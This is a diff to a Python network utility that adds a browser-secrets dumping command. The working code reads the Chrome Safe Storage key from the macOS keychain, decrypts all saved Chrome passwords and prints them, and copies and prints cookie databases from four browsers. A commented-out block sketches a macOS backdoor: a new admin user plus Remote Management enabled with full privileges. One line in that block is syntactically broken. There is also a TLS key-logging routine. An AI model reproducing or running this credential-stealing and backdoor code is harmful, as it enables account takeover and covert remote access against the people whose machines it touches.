@@ -42,17 +42,87 @@ import subprocess
 import socket
 import nmap
 import ipaddress
+import sqlite3
+import binascii
+import base64
+import hashlib
+import shutil
 import readline  # Added readline module for arrow key support
 import threading
 import datetime
 import colorama
-from colorama import init, Fore, Style
+from colorama import init, Fore, Back, Style
 from prettytable import PrettyTable
+from datetime import datetime, timedelta
 from termcolor import colored
 import scapy.all as scapy
 from tabulate import tabulate
+from Cryptodome.Cipher import AES
+
 
 #################### Utility Functions:
+
+'''
+def create_new_user(username, password):
+    # Create the new user
+    subprocess.run(['sudo', 'dscl', '.', 'create', f'/Users/{username}'])
+    subprocess.run(['sudo', 'dscl', '.', 'create', f'/Users/{username}', 'UserShell', '/bin/bash'])
+    subprocess.run(['sudo', 'dscl', '.', 'create', f'/Users/{username}', 'RealName', username])
+    subprocess.run(['sudo', 'dscl', '.', 'create', f'/Users/{username}', 'UniqueID', '1001'])
+    subprocess.run(['sudo', 'dscl', '.', 'create', f'/Users/{username}', 'PrimaryGroupID', '80'])
+    subprocess.run(['sudo', 'dscl', '.', 'create', f'/Users/{username}', 'NFSHomeDirectory', f'/Users/{username}'])
+    
+    # Set the password for the new user
+    subprocess.run(['sudo', 'dscl', '.', 'passwd', f'/Users/{username}', password])
+    
+    # Grant administrative privileges to the new user
+    subprocess.run(['sudo', 'dscl', '.', 'append', f'/Groups/admin', 'GroupMembership', username])
+    
+    # Enable Remote Management for the new user
+    subprocess.run(['sudo', '/System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart', '-activate', '-configure', '-access', '-on', '-restart', '-agent', '-privs', '-all'])
+
+def execute_script_with_admin_privileges(script_path, args):
+    # Execute the script with administrator privileges
+    subprocess.run(['/usr/bin/osascript' -e 'do shell script "sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -restart -agent -privs -all" with administrator privileges'])
+
+# Create a new user
+new_user = 'newuser'
+new_user_password = 'newpassword'
+create_new_user(new_user, new_user_password)
+
+# Execute the commands with administrator privileges
+script_path = '/path/to/myscript'
+script_args = 'arguments_here'
+execute_script_with_admin_privileges(script_path, script_args)
+'''
+''' placeholder Log_keys function order
+    mkdir tls/
+    touch tls/session-key.log
+    export SSLKEYLOGFILE="tls/session-key.log"
+    process_tcpdump_output([pcap_filter], num_threads)
+    open -n /Applications/Google\ Chrome.app
+    tshark -o 'tls.keylog_file:/Users/laithrafid/Desktop/code/tls/session-key.log' -r capture.pcap
+'''
+def Log_keys(pcap_filter, num_threads):
+    # Create the 'tls' directory
+    os.makedirs('tls', exist_ok=True)
+    
+    # Create the session-key.log file
+    with open('tls/session-key.log', 'w'):
+        pass
+    
+    # Export SSLKEYLOGFILE environment variable
+    os.environ['SSLKEYLOGFILE'] = 'tls/session-key.log'
+    
+    # Run process_tcpdump_output function with provided arguments
+    process_tcpdump_output(pcap_filter, num_threads)
+    
+    # Open Google Chrome
+    subprocess.Popen(['/Applications/Google Chrome.app/Contents/MacOS/Google Chrome'])
+    
+    # Run tshark with the specified options
+    tshark_command = ['tshark', '-o', 'tls.keylog_file:tls/session-key.log', '-r', 'capture.pcap']
+    subprocess.run(tshark_command)
 
 def validate_hostname(hostname):
     try:
@@ -149,22 +219,6 @@ def ping_ipv6(target, options):
             print_colored_output(line)
     except subprocess.CalledProcessError as e:
         print_message("error", f"Ping failed. Check the IPv6 address or hostname. Error: {e.output}")
-
-def print_colored_output(line):
-    line = line.rstrip("\n")  # Remove the trailing newline character
-    if "Request timeout for " in line or "100% packet loss" in line:
-        line = f"{Fore.RED}{line}{Style.RESET_ALL}"
-    elif "ttl=" in line:
-        line_parts = line.split()
-        for i, part in enumerate(line_parts):
-            if "ttl=" in part:
-                line_parts[i] = f"{Fore.MAGENTA}{part}{Style.RESET_ALL}"
-            elif "time=" in part:
-                line_parts[i] = f"{Fore.YELLOW}{part}{Style.RESET_ALL}"
-            elif "icmp_seq=" in part:
-                line_parts[i] = f"{Fore.GREEN}{part}{Style.RESET_ALL}"
-        line = " ".join(line_parts)
-    print(line)
 
 def process_line(line):
     # Define color codes
@@ -453,6 +507,177 @@ def create_colored_table():
     table.format = True
     return table
 
+def get_safe_storage_key():
+    cmd = [
+        "security",
+        "find-generic-password",
+        "-ga",
+        "Chrome",
+        "-w"
+    ]
+    try:
+        output = subprocess.check_output(cmd, stderr=subprocess.DEVNULL)
+        safe_storage_key = output.strip()
+        return safe_storage_key
+    except subprocess.CalledProcessError:
+        print("ERROR getting Chrome Safe Storage Key")
+        return None
+
+def decrypt_mac_chrome_password(encrypted_value, safe_storage_key):
+    iv = b' ' * 16
+    key = hashlib.pbkdf2_hmac('sha1', safe_storage_key, b'saltysalt', 1003)[:16]
+
+    cipher = AES.new(key, AES.MODE_CBC, IV=iv)
+    decrypted_pass = cipher.decrypt(encrypted_value)
+    decrypted_pass = decrypted_pass.rstrip(b"\x04").decode("utf-8", "ignore")
+    decrypted_pass = decrypted_pass.replace("\x08", "")  # Remove backspace characters
+    return decrypted_pass
+
+def get_datetime(timestamp, browser):
+    if browser == 'chrome' or browser == 'edge':
+        # Chrome and Edge timestamp format: microseconds since Jan 1, 1601 (UTC)
+        epoch_start = 11644473600000000  # Jan 1, 1601 in microseconds
+        delta = int(timestamp) - epoch_start
+        # Convert to seconds
+        timestamp_sec = delta // 1000000
+    elif browser == 'firefox':
+        # Firefox timestamp format: seconds since Jan 1, 1970 (UTC)
+        timestamp_sec = int(timestamp)
+    elif browser == 'safari':
+        # Safari timestamp format: seconds since Jan 1, 2001 (UTC)
+        timestamp_sec = int(timestamp) + 978307200
+    else:
+        raise ValueError("Unsupported browser")
+
+    return timestamp_sec
+
+def chrome_process(safe_storage_key, login_data):
+    decrypted_list = []
+    conn = None
+    try:
+        conn = sqlite3.connect(login_data)
+        cursor = conn.cursor()
+        cursor.execute("SELECT username_value, password_value, origin_url FROM logins")
+        rows = cursor.fetchall()
+        for row in rows:
+            user = row[0]
+            encrypted_pass = row[1][3:]  # removing 'v10' prefix
+            url = row[2]
+            if user == "" or encrypted_pass == "":
+                continue
+            else:
+                decrypted_pass = decrypt_mac_chrome_password(encrypted_pass, safe_storage_key)
+                url_user_pass_decrypted = (
+                    url.encode('ascii', 'ignore'),
+                    user.encode('ascii', 'ignore'),
+                    decrypted_pass.encode('ascii', 'ignore')
+                )
+                decrypted_list.append(url_user_pass_decrypted)
+    except sqlite3.Error as e:
+        print("SQLite error:", e)
+    finally:
+        if conn:
+            conn.close()
+
+    return decrypted_list
+
+def process_cookies(db_path, browser):
+    cookies_dict = {}
+    conn = None
+    try:
+        conn = sqlite3.connect(db_path)
+        cursor = conn.cursor()
+
+        if browser == 'chrome':
+            cursor.execute("SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly, has_expires, is_persistent, priority FROM cookies")
+        elif browser == 'firefox':
+            cursor.execute("SELECT host, name, value, path, expiry, isSecure, isHttpOnly, hasExpires, isPersistent FROM moz_cookies")
+        elif browser == 'edge':
+            cursor.execute("SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly, has_expires, is_persistent, priority FROM cookies")
+        else:
+            raise ValueError("Unsupported browser")
+
+        rows = cursor.fetchall()
+        for row in rows:
+            if browser == 'chrome' or browser == 'edge':
+                host, name, value, path, expires, is_secure, is_httponly, has_expires, is_persistent, priority = row
+                expires = get_datetime(expires, browser)
+            elif browser == 'firefox':
+                host, name, value, path, expires, is_secure, is_httponly, has_expires, is_persistent = row
+                expires = get_datetime(expires, browser)
+
+            if host not in cookies_dict:
+                cookies_dict[host] = []
+            cookies_dict[host].append((name, value, path, str(expires), is_secure, is_httponly, has_expires, is_persistent))
+    except sqlite3.Error as e:
+        print("SQLite error:", e)
+    finally:
+        if conn:
+            conn.close()
+    return cookies_dict
+
+def get_cookies(browser):
+    # Determine the user's operating system
+    operating_system = os.name
+
+    if operating_system == 'posix':  # macOS or Linux
+        if browser == 'chrome':
+            profile_path = os.path.expanduser("~/Library/Application Support/Google/Chrome/Default")
+            db_path = os.path.join(profile_path, "Cookies")
+            filename = "Cookies.db"
+        elif browser == 'firefox':
+            profile_path = os.path.expanduser("~/.mozilla/firefox")
+            profile_dir = None
+            for directory in os.listdir(profile_path):
+                if directory.endswith('.default-release') or directory.endswith('.default'):
+                    profile_dir = directory
+                    break
+            if profile_dir is None:
+                raise FileNotFoundError("Firefox profile directory not found")
+            db_path = os.path.join(profile_path, profile_dir, "cookies.sqlite")
+            filename = "cookies.sqlite"
+        elif browser == 'safari':
+            profile_path = os.path.expanduser("~/Library/Cookies")
+            db_path = os.path.join(profile_path, "Cookies.binarycookies")
+            filename = "Cookies.binarycookies"
+        elif browser == 'edge':
+            profile_path = os.path.expanduser("~/Library/Application Support/Microsoft Edge")
+            db_path = os.path.join(profile_path, "Cookies")
+            filename = "Cookies"
+        else:
+            raise ValueError("Unsupported browser")
+    elif operating_system == 'nt':  # Windows
+        if browser == 'chrome':
+            profile_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default")
+            db_path = os.path.join(profile_path, "Cookies")
+            filename = "Cookies.db"
+        elif browser == 'firefox':
+            profile_path = os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles")
+            profile_dir = None
+            for directory in os.listdir(profile_path):
+                if directory.endswith('.default-release') or directory.endswith('.default'):
+                    profile_dir = directory
+                    break
+            if profile_dir is None:
+                raise FileNotFoundError("Firefox profile directory not found")
+            db_path = os.path.join(profile_path, profile_dir, "cookies.sqlite")
+            filename = "cookies.sqlite"
+        elif browser == 'safari':
+            raise OSError("Safari is not supported on Windows")
+        elif browser == 'edge':
+            profile_path = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default")
+            db_path = os.path.join(profile_path, "Cookies")
+            filename = "Cookies"
+        else:
+            raise ValueError("Unsupported browser")
+    else:
+        raise OSError("Unsupported operating system")
+
+    # Copy the file to the current directory
+    shutil.copyfile(db_path, filename)
+
+    return filename
+
 #################### Commnads and Subprocess to Run:
 
 def run_traceroute(target, options):
@@ -511,6 +736,70 @@ def check_open_ports_nmap(target, ports=None):
 
     return open_ports
 
+def dump_browser_sec(target,options):
+    # Main code
+    if "chrome" in target:
+        if "cookies" in options or "all" in options:
+            cookies_db = get_cookies(target)
+            cookies_dict =  process_cookies(cookies_db, target)
+            print_cookies_table(cookies_dict,target)
+        
+        elif "passwords" in options or "all" in options:
+            profile_path = os.path.expanduser("~/Library/Application Support/Google/Chrome/Default")
+            login_data = [
+            os.path.join(profile_path, "Login Data"),
+            os.path.join(profile_path, "Login Data For Account")
+            ]
+            safe_storage_key = get_safe_storage_key()
+            if safe_storage_key is None:
+                sys.exit()
+
+            all_decrypted_passwords = []
+            for data_file in login_data:
+                if os.path.exists(data_file):
+                    # Create a temporary copy of the SQLite database
+                    temp_data_file = os.path.join(profile_path, "Temp Login Data")
+                    shutil.copyfile(data_file, temp_data_file)
+                    decrypted_passwords = chrome_process(safe_storage_key, temp_data_file)
+                    all_decrypted_passwords.extend(decrypted_passwords)
+                    # Delete the temporary copy
+                    os.remove(temp_data_file)
+
+
+            if all_decrypted_passwords:
+                header = (Fore.BLUE + "No.", "Site", "Username", "Password" + Style.RESET_ALL)
+                #print(all_decrypted_passwords) only for debuging integrity of sctipt output parsing
+                print(f"{header[0]:<5} {header[1]:<30} {header[2]:<20} {header[3]:<20}")
+                print("=" * 80)
+
+                for i, x in enumerate(all_decrypted_passwords):
+                    print(f"{Fore.GREEN}{i+1:<5}{Style.RESET_ALL} {Fore.CYAN}{x[0].decode():<30}{Style.RESET_ALL} {Fore.YELLOW}{x[1].decode():<20}{Style.RESET_ALL} {Fore.RED}{x[2].decode():<20}{Style.RESET_ALL}")
+            else:
+                print("No Chrome passwords found in the specified profiles.")
+    elif "firefox" in target:
+        if "cookies" in options or "all" in options:
+            cookies_db = get_cookies(target)
+            cookies_dict =  process_cookies(cookies_db, target)
+            print_cookies_table(cookies_dict,target)
+        else:
+            print_message("error",f"no code logic for this target browser {target} yet")
+    elif "edge" in target:
+        if "cookies" in options or "all" in options:
+            cookies_db = get_cookies(target)
+            cookies_dict =  process_cookies(cookies_db, target)
+            print_cookies_table(cookies_dict,target)
+        else:
+            print_message("error",f"no code logic for this target browser {target} yet")
+    elif "safari" in target:
+        if "cookies" in options or "all" in options:
+            cookies_db = get_cookies(target)
+            cookies_dict =  process_cookies(cookies_db, target)
+            print_cookies_table(cookies_dict,target)
+        else:
+            print_message("error",f"no code logic for this target browser {target} yet")
+    else: 
+        print_message("error","Error please Enter a valid target")
+
 #################### Display Functions:
 def print_message(message_type,message):
     # Define color codes
@@ -528,6 +817,35 @@ def print_message(message_type,message):
     # Print the message with the corresponding color
     print(f"{color_code}{message}{Style.RESET_ALL}")
 
+def print_colored_output(line):
+    line = line.rstrip("\n")  # Remove the trailing newline character
+    if "Request timeout for " in line or "100% packet loss" in line:
+        line = f"{Fore.RED}{line}{Style.RESET_ALL}"
+    elif "ttl=" in line:
+        line_parts = line.split()
+        for i, part in enumerate(line_parts):
+            if "ttl=" in part:
+                line_parts[i] = f"{Fore.MAGENTA}{part}{Style.RESET_ALL}"
+            elif "time=" in part:
+                line_parts[i] = f"{Fore.YELLOW}{part}{Style.RESET_ALL}"
+            elif "icmp_seq=" in part:
+                line_parts[i] = f"{Fore.GREEN}{part}{Style.RESET_ALL}"
+        line = " ".join(line_parts)
+    print(line)
+
+def print_cookies_table(cookies_dict, browser):
+    header = (Fore.GREEN + "Host", "Cookie Name", "Cookie Value", "Path", "Expires", "Is Secure", "Is HTTP Only", "Has Expires", "Is Persistent", "Priority" + Style.RESET_ALL)
+    print(f"{header[0]:<20} {header[1]:<30} {header[2]:<30} {header[3]:<20} {header[4]:<20} {header[5]:<10} {header[6]:<12} {header[7]:<12} {header[8]:<15} {header[9]:<10}")
+    print("=" * 160)
+
+    for host, cookies in cookies_dict.items():
+        print(f"{Fore.RED}Domain: {host}{Style.RESET_ALL}\n")
+        for cookie in cookies:
+            print(f"{Fore.GREEN}{host:<20} {Style.RESET_ALL}{Fore.CYAN}{cookie[0]:<30} {cookie[1]:<30} {cookie[2]:<20} {cookie[3]:<20} {str(cookie[4]):<10} {str(cookie[5]):<12} {str(cookie[6]):<12} {str(cookie[7]):<15} {str(cookie[8]):<10}{Style.RESET_ALL}")
+        print("\n")
+
+
+
 def print_help():
     print("This script is built to run on Windows, Linux, or macOS.")
     print(Fore.MAGENTA + "Usage:" + Style.RESET_ALL + " python netsec.py "+ Fore.CYAN + "[Option]" + Style.RESET_ALL +  Fore.RED + " [Arguments]" + Style.RESET_ALL +"\n")
@@ -538,6 +856,7 @@ def print_help():
     print("  -ps, --portscan_scapy    Run ports scan using scapy with colorized output")
     print("  -pn, --portscan_nmap     Run ports scan using Nmap with colorized output")
     print("  -p , --ping              Run ping(4|6) with colorized output")
+    print("  -ds, --dump_browser_sec  Run functions to dump secrets from browsers")
     print("  -h , --help              Show help")
     print_message("error", f"Arguments:\n")
     print("for option specific arguments use options -h")
@@ -613,6 +932,18 @@ def print_help_p():
     print_message("error", f"ping_options:")
     print_help_ping4()
     print_help_ping6()
+
+def print_help_ds():
+    print(Fore.MAGENTA + "Usage:" + Style.RESET_ALL + " python netsec.py -ds, --dump_browser_sec "+ Fore.RED + "[options]" + Style.RESET_ALL  + Fore.GREEN +"[target]"+ Style.RESET_ALL +"\n")
+    print(Fore.GREEN +"target:" + Style.RESET_ALL)
+    print("chrome")
+    print("safari")
+    print("edge")
+    print("firefox")
+    print(Fore.RED + "options:" + Style.RESET_ALL)
+    print("all : will print all secrets (cookies and passwords) from browser")
+    print("cookies : will print table of cookies information grouped by domain like Host, Cookie Name, Cookie Value, Path, Expires,...etc ")
+    print("passwords : will print a table of all Sites, Usernames, Passwords")
 
 def print_colored_table_ports(open_ports):
     headers = ["Port"]
@@ -1030,6 +1361,26 @@ def main():
                             print_message("info", "Ping interrupted by user.")
                             sys.exit(0)
             pass    
+
+        elif option in ['-ds', '--dump_browser_sec']:
+            if  "-h" in sys.argv[2:] :
+                print_help_ds()
+            elif len(sys.argv) < 3:
+                print_message("info", f"No Target browser chosen (chrome, firefox, edge, safari) or Options(all, cookies, Passwords)")
+                print_help_ds()
+                return
+            elif len(sys.argv) >= 3:
+                target = sys.argv[-1]
+                options = sys.argv[2:-1]
+                if "firefox" in target or "safari" in target or "edge" in target or "chrome" in target:
+                    if "all" in options or "passwords" in options or "cookies" in options:
+                        dump_browser_sec(target,options)
+                    else:
+                        print_message("error", "Enter a valid option")
+                        print_help_ds()
+                else:
+                    print_message("error", "Enter a valid target")
+                    print_help_ds()
 
         elif option in ['-h', '--help']:
             print_help()
